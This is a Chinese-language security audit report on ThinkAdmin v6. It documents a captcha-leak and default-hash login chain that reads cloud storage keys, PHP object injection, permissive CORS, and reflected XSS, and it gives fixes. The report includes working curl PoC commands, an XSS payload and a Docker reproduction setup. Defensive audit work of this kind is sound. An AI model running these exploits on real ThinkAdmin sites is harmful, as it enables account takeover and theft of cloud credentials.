# ThinkAdmin v6 安全审计报告

> 目标：以「未认证 0-click 泄漏云 AK/SK」为核心意图的白盒审计；并提供 Docker 可复现环境。
> 原则：只写已确认事实；每条发现给出完整数据流（`文件:行`）、可达性、PoC、可串联链；并主动排除反证。

## 0. 审计对象与框架字典

| 组件 | 版本 | 说明 |
|---|---|---|
| topthink/framework | v8.1.4 | ThinkPHP 8 基座 |
| topthink/think-orm | v3.0.34 | ORM |
| zoujingli/think-library | v6.1.98 | ThinkAdmin 核心库 |
| zoujingli/think-plugs-admin | v1.0.79 | 后台插件（控制器真身） |
| zoujingli/think-plugs-wechat | v1.0.52 | 微信插件 |
| zoujingli/wechat-developer | v1.1.17 | 微信 SDK |

- **source**：`input()` / `$request->get|post|param` / 路由变量 / 请求头；全局经 `xss_safe()` 过滤（`Library.php` HttpRun）。
- **sink（AK/SK）**：`sysconf('storage.*' / 'wechat.*')` 读写；`system_config` 表**明文**存储全部密钥。
- **鉴权模型（可达性原语）**：
  - `RbacAccess` 中间件对每个路由检查 `rbac_ignore`（=`['index']`，整个 `index` 应用免检）或 `AdminService::check()`。
  - **方法默认公开**：`NodeService::_parseComment`（`service/NodeService.php:214-216`）只在方法注释含 `@auth true` 或 `@login true` 时标记需鉴权；两者皆无 → `AdminService::check()`（`service/AdminService.php:179-212`）返回 `true` → **未认证可访问**。
- `sysconf('')` 空名返回整个配置数组；`SystemService::get()` 非 `|raw` 时仅对值做 `htmlspecialchars`（不影响密钥泄漏）。

**赢的条件**：任何未认证途径读到 `system_config`（SQLi / 配置反射）或取得管理员会话 = 全部 AK/SK 明文。

---

## 1. 高危发现（按严重级排序）

### 🔴 A1 — 验证码明文泄漏 + 默认超管凭据 ⇒ 未认证读取全部云 AK/SK（端到端已现场验证）

- **类别**：认证绕过 / 敏感信息泄漏（反自动化控制失效 → 账号接管 → 密钥泄漏）
- **可达性**：**未认证、0-click**（无需任何受害者交互）；前置条件：默认口令未修改（或配合 A5 在线暴破弱口令）。
- **位置 / 数据流**：
  1. `app/admin/controller/Login.php:123-125` — `captcha()`：当会话无 `LoginInputSessionError` 标志时，JSON 响应直接回显明文验证码：
     ```php
     if (!$this->app->session->get('LoginInputSessionError')) {
         $captcha['code'] = $image->getCode();   // ← 明文验证码泄漏
     }
     ```
  2. `vendor/.../support/middleware/JwtSession.php:77-82` — 会话 ID 由请求参数 `var_session_id` 或 cookie 决定（**攻击者可控**）；每次用全新会话即可保证无错误标志 → 验证码恒泄漏；登录动作**无限流、无锁定**。
  3. `app/admin/controller/Login.php:93` — 口令校验 `md5("{$user['password']}{$data['uniqid']}") !== $data['password']`：以**存储哈希**作为登录共享秘密。默认超管 `admin` 的哈希 = `md5("admin")` = `21232f297a57a5a743894a0e4a801fc3`（公开），攻击者构造 `password = md5("21232f...".uniqid)` 即可登录，无需明文口令。
  4. `config/app.php:25` `super_user=admin` → `AdminService::check()`（`AdminService.php:199`）对超管直接放行 → `admin/config/storage?type=alioss|txcos|qiniu|upyun` 表单以 `value="{:sysconf('storage.xxx_secret_key')}"` **明文回显** AK/SK。
- **PoC（已在复现环境验证成功）**：
  ```bash
  # 1) 未认证取验证码，直接得到明文 code 与 uniqid
  curl -s -c cj.txt "http://TARGET/admin/login/captcha.html?type=LoginCaptcha&token=x"
  #    → {"data":{"uniqid":"captcha...","code":"E9U6"}}
  # 2) 用公开的默认超管哈希构造应答登录
  PASS=$(php -r 'echo md5("21232f297a57a5a743894a0e4a801fc3"."<uniqid>");')
  curl -s -b cj.txt -c cj.txt -X POST "http://TARGET/admin/login/index.html" \
       -d "username=admin&verify=<code>&uniqid=<uniqid>&password=$PASS"
  #    → {"code":1,"info":"登录成功"}
  # 3) 读取云存储 AK/SK
  curl -s -b cj.txt "http://TARGET/admin/config/storage.html?type=alioss"  # alioss_access_key / alioss_secret_key
  curl -s -b cj.txt "http://TARGET/admin/config/storage.html?type=txcos"   # txcos_access_key  / txcos_secret_key
  curl -s -b cj.txt "http://TARGET/admin/config/storage.html?type=qiniu"   # qiniu_access_key  / qiniu_secret_key
  ```
  完整脚本见 `docker-poc/poc_exploit.sh`。
- **反证排除**：登录唯一的反自动化控制是图形验证码，已被明文泄漏击穿；读取配置为 GET 且后台无 CSRF 限制读取；无登录限流/锁定；用户名查询为 ORM 参数化（无 SQLi），口令比较用严格 `!==`（无类型混淆）——但这些都不影响本链成立。
- **攻击链**：泄漏的 AK/SK → 直接调用对应云服务（OSS/COS/七牛对象存储读写、接管存储桶）。

### 🔴 A2 — 可预测/空 `data.jwtkey` ⇒ 未认证 PHP 对象注入（`unserialize`）

- **类别**：不安全反序列化（PHP Object Injection）
- **可达性**：**未认证、0-click**；前置条件：`data.jwtkey` 为空或弱/可预测。
  - 何时为空：全新实例且管理员**尚未保存过系统配置**、且该实例走 cookie 会话（从未因 `jwt-token` 请求触发 `JwtExtend::jwtkey()` 的自动随机生成）。纯后台（cookie）部署常年处于此状态。
- **位置 / 数据流**：
  - `vendor/.../extend/CodeExtend.php:139` — `decrypt()` 末尾：
    ```php
    return unserialize(openssl_decrypt($attr['value'], 'AES-256-CBC', $skey, 0, $attr['iv']));
    ```
  - 未认证 sink：`GET /admin/api.plugs/script?uptoken=<forged>`（`app/admin/controller/api/Plugs.php:82`，方法无 `@auth/@login`）
    → `AdminService::withUploadUnid($token)`（`service/AdminService.php:298`）
    → `CodeExtend::decrypt($uptoken, sysconf('data.jwtkey'))` → `unserialize()`。
  - 密钥已知/空时，攻击者用相同密钥 `CodeExtend::encrypt(serialize($gadget), $key)` 即可伪造出会被 `unserialize` 的 token。空密钥时 AES-256-CBC 使用全零密钥，结果确定。
- **PoC（对象注入原语已现场验证）**：见 `docker-poc/poc_deser.php`，空密钥 `''` 与可预测密钥均成功触发攻击者对象的 `__wakeup()`/`__destruct()`，攻击者完全控制 `unserialize` 的对象类型与属性。
- **第二个未认证 sink（后续轮次确认，更广）**：`jwt-token` 头 → 全局 `JwtSession` 中间件（`Library.php:170-172`，非 api/非 rpc 的浏览器请求在**任意 `admin`/`index` 路由**上生效）→ `JwtExtend::verify`（`JwtExtend.php:174`）→ `decrypt($payload['enc'])` → `unserialize`。
  - 修正早先判断：此 sink 仅在 `data.jwtkey` **为空**时"自愈"（`verify` 内 `jwtkey()` 会先自动生成随机密钥再验签）；当 `data.jwtkey` 是**已知/弱**值（非空）时，`jwtkey()` 直接返回该值，攻击者用它算出合法 HMAC 签名通过，随后 `decrypt($enc)` 照常 `unserialize`。已 harness 实测触发 `__wakeup`。**比单一 uptoken 端点覆盖面更广**。
- **到 AK/SK 的完整利用（SUSPECTED，经三轮实测仍未打通）**：需要 POP gadget 链实现文件写/RCE/SQL写/带外 SSRF 以读取 `system_config`。**本精确依赖集穷尽后无可用 gadget**：
  - think-orm v3.0.34 已移除经典 `Model::__destruct → save` 链（`Model::__wakeup` 仅 `initialize()`）。
  - 新发现一个**可达的** gadget 原语 `Ip2Region::__destruct → $this->searcherV4->close()`（`vendor/zoujingli/ip2region/src/Ip2Region.php:100`，全局类/无 `strict_types`/classmap 自动加载），实测经上述 sink 可让**任意攻击者对象的 `close()` 被调用**；但依赖集内**无任何可武器化的 `close()`**（全部为 `fclose`/清内存/置空；带参 `close()` 抛 `ArgumentCountError`；`Model::__call('close')` 抛 `Error`）。原语止于无害方法。
  - `phar://` 反序列化：PHP 8.3 被动文件操作**不再**自动反序列化 phar metadata，且全仓 **0 处** `Phar::getMetadata()`/`new Phar()`，未认证面亦无 `phar://` 可控路径——三重封死。
  - `__toString` 桥：vendor 全树**无任何** `__destruct/__wakeup` 对对象属性做隐式字符串化（桥无起点）；`strict_types` 又使字符串强制转换抛 `TypeError` 而非调 `__toString`。
  - **决定性约束**：两个 0-click sink **不向攻击者回传任何数据**（`setId(?string)`/`json_decode(string)` 失败被 `catch`），故即便存在"任意文件读" gadget 亦无从带出——本路径必须要文件写/RCE/SQL写/带外 SSRF 级 gadget，而其不存在。
  - 结论：**已确认的未认证 0-click 对象注入原语（两个 sink）**；完整到 AK/SK 的链在本依赖集**未打通**。若目标实例新增含 `__destruct/__wakeup/close()` 副作用 gadget 的第三方包，或叠加一个写库/SQLi 立足点（见 A6 二级 gadget），则可升级为 RCE。

### 🟠 A3 — CORS 任意源反射 + 携带凭据（链条元素）

- **类别**：CORS 配置错误
- **可达性**：未认证可触发响应头，但形成危害需**诱导已登录管理员**访问恶意页（1-click，非 0-click）。
- **位置 / 数据流**：`vendor/.../Library.php` register() 的 CORS 中间件：`app.cors_on` 默认 `true`；`app.cors_host` 默认空 → `empty($hosts)` 成立 → 回显任意 `Origin`，并设 `Access-Control-Allow-Credentials: true`。
- **验证**：`Origin: https://evil.example.com` → 响应 `Access-Control-Allow-Origin: https://evil.example.com` + `Allow-Credentials: true`（已现场确认）。
- **攻击链**：管理员访问攻击者页面 → 跨域带 cookie 请求 `admin/config/storage` → 读取 AK/SK 回传。

### 🟠 A4 — 微信内容展示接口未认证反射型 XSS（链条元素）

- **类别**：反射型 XSS
- **可达性**：未认证可达；危害需受害者点击（1-click）。
- **位置 / 数据流**：`app/wechat/controller/api/View.php`（`text/image/video/voice/music`）：`strip_tags(input('content'), '<a><img>')` 保留 `<img>` → 模板 `{$content|raw}` 原样输出。
- **验证**：`GET /wechat/api.view/text.html?content=<img src=x onerror=alert(document.domain)>` 原样回显（已现场确认）。
- **攻击链**：与后台同源 → 诱导已登录管理员点击 → XSS 同源 `fetch('/admin/config/storage?type=alioss')` 读取并外带 AK/SK（无需 CORS）。

### 🟡 A5 — 口令存储为无盐 MD5 + 默认 `admin/admin`（放大 A1）

- **类别**：弱口令哈希 / 默认凭据
- **位置**：`SystemUser` 口令 = `md5($password)` 无盐（`app/admin/controller/Index.php:131` 等）；安装种子 `database/migrations/20241010000002_install_admin20241011.php:62` 植入 `admin`=`md5("admin")`。
- **影响**：配合 A1 的验证码击穿与无限流，可对任意账号在线无限暴破；无盐 MD5 口令一旦库被读出即秒解。

### 🟡 A6 — 枚举盲区与二级 gadget（后续轮次补充，均未自达 AK/SK）

- **闭包路由盲区（方法论修正）**：前述"未认证方法"是按控制器 `@auth` 注解枚举的，**结构性地看不到插件 `Service::register()` 里用闭包注册的路由**（闭包无 `@auth` 概念，天生未认证）。全仓运行时闭包路由仅一条：`app/wechat/Service.php:64` 的 `/plugin-wxpay-notify/:vars` → `CodeExtend::deSafe64`（**无密钥** base64）+ `json_decode` → `PaymentService::notify($data)`，`$data` 全可控且异常消息经 `"Error: {msg}"` 回显。
  - **到 AK/SK 证伪**：`notify()`/`query()` 的关键分支需有效微信支付配置 + 微信平台签名回调（`withPayment()->notify(post())` 验签），攻击者可控的 `$data['order']` 只流向微信 API 查询与错误回显，`WechatPaymentSuccess` 事件全仓无监听者。默认无支付配置时仅得报错回显。
- **二级 gadget（需写库/SQLi 立足点才 live）**：`support/command/Queue.php:303-308` `class_exists($command) → $this->app->make($command) → execute(json_decode(exec_data))` 是**任意类名构造实例化 + 可控 data** 的 sink；但 `system_queue.command` 唯一写入点恒为 `xadmin:*` 字面量，需 **SQLi 或已认证写库**把类名写进该列才可触发 → 非未认证路径，记作"一旦有写库立足点即可升级 RCE"的二级利用。
- **debug 信息泄漏证伪到 AK/SK**：debug 开时异常 Trace 页确泄露绝对路径/SQL/session，但 `zend.exception_ignore_args=On`（PHP 7.4+ 默认，实测确认）剥除调用栈全部参数，AK/SK 与 DB 口令**不出现**在 Trace 中。
- **thr 模式任意方法分发**：`Push::index` 在 `wechat.type=thr` 时 `$this->{$receive['msgtype']}()`（含私有方法，仅 0 参），可达方法无新 sink，且需 thr 配置。

---

## 2. 已覆盖维度与结论

| 维度 | 结论 | 关键证据 |
|---|---|---|
| 认证/授权绕过 | 鉴权模型厘清；A1 账号接管链成立；JWT 伪造成 admin **证伪** | `AdminService.php:179-212`；`JwtExtend::verify` 空密钥自愈 |
| 不安全反序列化 | A2 对象注入原语**确认**；到 RCE 的 gadget 未证实 | `CodeExtend.php:139`；think-orm 3.x 已去链 |
| SQL 注入（未认证） | **证伪**：值全绑定、标识符严格校验、表/字段名硬编码 | `think-orm Builder/Mysql parseKey`；`QueryHelper` 字段由控制器硬编码 |
| 排序注入（layTable） | **证伪**：`parseOrder` 用 `/^[\w\.]+$/` + ASC/DESC 白名单 | `think-orm Builder.php:539-556` |
| 命令注入（队列） | **证伪（未认证）**：`ProcessService::exec` 裸 shell sink 真实，但进 shell 的唯一变量是服务端生成的队列 `code`（`Q`+数字）；存库 `command` 走 `console->call(argv)` 非 shell，均硬编码 `xadmin:*`；队列 API 全 `@login`。见 A6 二级 gadget | `ProcessService.php:113`；`support/command/Queue.php:303-317` |
| SSTI / 模板注入 | **证伪**：模板名硬编码，变量仅运行时 echo 不编译 | think-template `fetch`；`display()` 零输入调用 |
| 文件读取 / LFI | **证伪**：未认证面无输入拼接的 `include/file_get_contents` 路径 | — |
| 多语言 LFI/RCE | **证伪**：`detect` 正则 `/^([a-z\d\-]+)/i` + `allow_lang_list=['zh-cn']` | framework `LoadLangPack` |
| SSRF | **证伪**：微信 SDK host 硬编码；`MediaService::upload` 的 URL 取自管理员设的 DB 行 | `wechat-developer Oauth/Script`；`MediaService` |
| 硬编码/默认密钥 | A2（空/弱 jwtkey）、A5（默认口令/无盐 md5）**确认** | `CodeExtend`、安装种子 |
| 依赖 CVE | `composer audit` 无已知通告 | — |
| 越权逻辑 | `Upload::state` 泄 AK 路径**证伪**（`withUploadToken` 全仓零调用，`AdminUploadUnid` 永不被设） | `AdminService.php:279-328` |
| CORS / XSS | A3 / A4 **确认**（链条元素） | `Library.php`、`View.php` |

## 2.1 「非默认口令 → AK/SK」路径裁决（三轮多代理实测后）

| 路径 | 到 AK/SK | 前提 |
|---|---|---|
| A1 验证码明文泄漏 + 在线无限暴破 | ✅ 能（默认口令已端到端跑通；弱/可猜口令可暴破） | 口令可猜 |
| A3 CORS / A4 反射型 XSS | ✅ 能，但 **1-click** | 需诱导已登录管理员 |
| A2 反序列化对象注入（两个未认证 0-click sink） | ⚠️ 原语确认，**完整链未打通**（无可用 gadget；sink 不回传数据） | 弱/空 jwtkey |
| A6 队列 `app->make` 二级 gadget | ⚠️ 需先有 SQLi/写库立足点 | 非未认证 |
| phar / SSRF / debug-Trace / 支付闭包 / Upload::state / JWT→admin | ❌ 实测证伪 | — |

**裁决**：不依赖后台口令时，**没有一条纯代码的未认证 0-click 能真正取出 AK/SK**——反序列化卡在"缺 gadget"，队列注入卡在"缺写库立足点"。真正现成可取密钥的仍是 A1（含非默认但可猜口令）与 A3/A4（需管理员交互）。

## 3. 未覆盖项及原因

- **A2 的完整 POP gadget 链**：已对本精确依赖集穷尽（native unserialize / phar / 非 strict `__toString` 桥 / 模板缓存写 / think-orm 深链 / Ip2Region `close()` 原语），**确认无可用 gadget**；若目标实例新增含 `__destruct/__wakeup/close()` 副作用的第三方包，或叠加写库/SQLi 立足点（A6），需回归评估。
- **弱 jwtkey 的会话伪造**：`JwtSession` 用解密出的 `.ssid` 调 `session->setId(攻击者值)`，但 JWT 不写 `user.id`、新 ssid 服务端会话为空，初判仍为 dead-end（未单独做 harness 彻底钉死）。
- **会员前端上传插件**（`think-plugs-static` 之外的会员上传能力）：会调用 `AdminService::withUploadToken()`，本安装未包含该调用方，故 `Upload::state` 的未认证 AK 回显路径在本安装不可达；若装了相关会员插件需回归审计。
- **第三方消息模式（`wechat.type=thr`）下 `Push::index` 的动态方法调用**：默认 `api` 模式未走该分支，未展开。

---

## 4. 复现环境（Docker）

见 `docker-poc/`：
- `Dockerfile` / `docker-compose.yml`：PHP 8.3 + SQLite，复用已安装的 `vendor/`；
- `entrypoint.sh`：建库迁移（种子 `admin/admin`）+ 注入模拟 AK/SK + 启动内置服务器（:8099）；
- `seed.php`：写入与 think-library 存储类一致键名的模拟密钥（`storage.alioss_secret_key` 等）；
- `poc_exploit.sh`：A1 端到端利用（验证码泄漏 → 默认登录 → 读 AK/SK）；
- `poc_deser.php`：A2 对象注入原语验证。

```bash
docker compose -f docker-poc/docker-compose.yml up --build
# 浏览器 http://127.0.0.1:8099/admin/login/index.html  (admin/admin)
bash docker-poc/poc_exploit.sh http://127.0.0.1:8099
```

## 5. 修复建议（摘要）

1. **A1**：`captcha()` 任何情况下都不返回明文 `code`；验证码一次性失效、绑定会话、服务端比对；登录加失败限流/锁定；安装流程强制改默认口令。
2. **A2**：`CodeExtend::decrypt()` 禁止直接 `unserialize`，改为 `json_decode` 或 `unserialize($x, ['allowed_classes'=>false])`（uptoken 与 jwt-token `enc` 两个 sink 都要修）；`data.jwtkey` 安装时强制随机生成并校验长度，杜绝空/弱值。
3. **A3**：`cors_host` 默认不回显任意源；`Allow-Credentials: true` 时必须显式白名单且不得使用 `*`/回显。
4. **A4**：`View::*` 输出改为转义（去掉 `|raw`），或对 `content` 做严格白名单净化。
5. **A5**：口令改为带盐的强哈希（password_hash/bcrypt）。
6. **A6**：`support/command/Queue.php` 的 `app->make($command)` 应校验 `$command` 为已登记的指令/白名单类，拒绝任意类名实例化；`system_queue.command` 写入侧做白名单；支付闭包路由对 `vars` 做签名校验而非仅 `deSafe64`。
